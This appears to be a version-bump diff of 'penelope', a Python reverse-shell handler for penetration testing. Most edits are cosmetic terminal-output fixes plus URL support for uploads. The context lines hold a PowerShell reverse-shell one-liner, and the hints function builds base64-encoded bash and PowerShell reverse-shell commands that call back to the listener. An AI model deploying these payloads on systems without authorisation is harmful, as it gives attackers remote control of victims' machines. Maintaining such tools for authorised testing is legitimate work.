@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.12.15"
+__version__ = "0.12.16"
 
 import os
 import io
@@ -111,7 +111,7 @@ def Open(item, terminal=False):
 
 def ask(text):
 	try:
-		return input(f"\r{paint(f'[?] {text}: ').yellow}")
+		return input(f"{paint(f'[?] {text}: ').yellow}")
 
 	except EOFError:
 		return ask(text)
@@ -320,15 +320,14 @@ class CustomFormatter(logging.Formatter):
 		logging.ERROR:		{'color':"red",		'prefix':"[-]"},
 		logging.WARNING:	{'color':"yellow",	'prefix':"[!]"},
 		logging.INFO:		{'color':"green",	'prefix':"[+]"},
-		logging.DEBUG:		{'color':"magenta",	'prefix':"[---DEBUG---]"}
+		logging.DEBUG:		{'color':"magenta",	'prefix':"[DEBUG]"}
 	}
 	def format(self, record):
 		template = __class__.TEMPLATES[record.levelno]
-		prefix = "\r" if core.attached_session is None else ""
-		suffix = "\r" if core.attached_session is not None else ""
-		thread = paint(" ") + paint(threading.current_thread().name).white_CYAN\
-			if record.levelno is logging.DEBUG or options.debug else ""
-		text = prefix + f"{template['prefix']}{thread} {logging.Formatter.format(self, record)}" + suffix
+		thread = ""
+		if record.levelno is logging.DEBUG or options.debug:
+			thread = paint(" ") + paint(threading.current_thread().name).white_CYAN
+		text = f"{template['prefix']}{thread} {logging.Formatter.format(self, record)}"
 		return str(getattr(paint(text), template['color']))
 
 class BetterCMD:
@@ -557,7 +556,7 @@ class MainMenu(BetterCMD):
 	def confirm(text):
 		try:
 			__class__.set_auto_history(False)
-			answer = input(f"\r{paint(f'[?] {text} (y/N): ').yellow}")
+			answer = input(f"{paint(f'[?] {text} (y/N): ').yellow}")
 			__class__.set_auto_history(True)
 			return answer.lower() == 'y'
 
@@ -1142,7 +1141,6 @@ class MainMenu(BetterCMD):
 		if core.listeners:
 			print()
 			for listener in core.listeners.values():
-				print(paint(f"{listener} hints:").cyan_UNDERLINE)
 				print(listener.hints, end='\n\n')
 		else:
 			cmdlogger.warning("No registered Listeners to show hints")
@@ -1679,14 +1677,15 @@ class Listener:
 			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
 		]
 
-		output = []
+		output = [str(paint(self).white_MAGENTA)]
+		output.append("")
 		ips = [self.host]
 
 		if self.host == '0.0.0.0':
 			ips = [ip for ip in Interfaces().list.values()]
 
 		for ip in ips:
-			output.extend(('', '➤  ' + str(paint(ip).CYAN) + ":" + str(paint(self.port).red), ''))
+			output.extend(('➤  ' + str(paint(ip).CYAN) + ":" + str(paint(self.port).red), ''))
 			output.append(f"echo -n {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
 			output.append("")
 			output.append("cmd /c powershell -e " + base64.b64encode(presets[1].format(ip, self.port).encode("utf-16le")).decode())
@@ -1699,11 +1698,8 @@ class Listener:
 			set DisablePayloadHandler true
 			""").split("\n"))
 
-			output.append("-" * 80)
-
-		#output.append("─" * len(max(output, key=len)))
-
-		return f'\r\n'.join(output)
+		output.append("─" * 80)
+		return '\n'.join(output)
 
 
 class LineBuffer:
@@ -3061,7 +3057,9 @@ class Session:
 
 		# Initialization
 		try:
-			local_items = [normalize_path(item) for item in shlex.split(local_items)]
+			local_items = [item if re.match(r'(http|ftp)s?://', item, re.IGNORECASE)\
+				 else normalize_path(item) for item in shlex.split(local_items)]
+
 		except ValueError as e:
 			logger.error(e)
 			return []
@@ -3553,7 +3551,7 @@ class Session:
 		self.socket.close()
 
 		if not self.OS:
-			message = f"Invalid shell from {paint(self.name).white_RED} 🙄\r"
+			message = f"Invalid shell from {paint(self.name).white_RED} 🙄"
 		else:
 			message = f"Session [{self.id}] died..."
 
@@ -4100,7 +4098,7 @@ class FileServer:
 			output.append(str(table))
 			output.append("-" * len(output[1]))
 
-		return f'\r\n'.join(output)
+		return '\n'.join(output)
 
 	def start(self):
 		threading.Thread(target=self._start).start()
@@ -4470,10 +4468,10 @@ def listener_menu():
 
 	listener_menu.finishing = threading.Event()
 
-	tty.setraw(sys.stdin)
 	while True:
+		tty.setraw(sys.stdin)
 		sys.stdout.write(
-			f"\x1b[?25l{paint('➤ ').white} "
+			f"\r\x1b[?25l{paint('➤ ').white} "
 			f"💀 {paint('Show Payloads').magenta} (p) "
 			f"🏠 {paint('Main Menu').green} (m) "
 			f"🔄 {paint('Clear').yellow} (Ctrl-L) "
@@ -4482,11 +4480,14 @@ def listener_menu():
 		sys.stdout.flush()
 
 		r, _, _ = select([sys.stdin, listener_menu.control_r], [], [])
+		termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
+
 		if sys.stdin in r:
 			command = sys.stdin.read(1).lower()
 			if command == 'p':
+				print()
 				for listener in core.listeners.values():
-					sys.stdout.write(f"\r\n{listener.hints}\r\n")
+					print(listener.hints, end='\n\n')
 			elif command == 'm':
 				func = menu.show
 				break
@@ -4499,11 +4500,10 @@ def listener_menu():
 			continue
 		break
 
-	termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
-	sys.stdout.write("\x1b[?25h")
+	sys.stdout.write("\x1b[?25h\r")
 	sys.stdout.flush()
-	if func: func()
-
+	if func:
+		func()
 	os.close(listener_menu.control_r)
 	listener_menu.active = False
 	listener_menu.finishing.set()
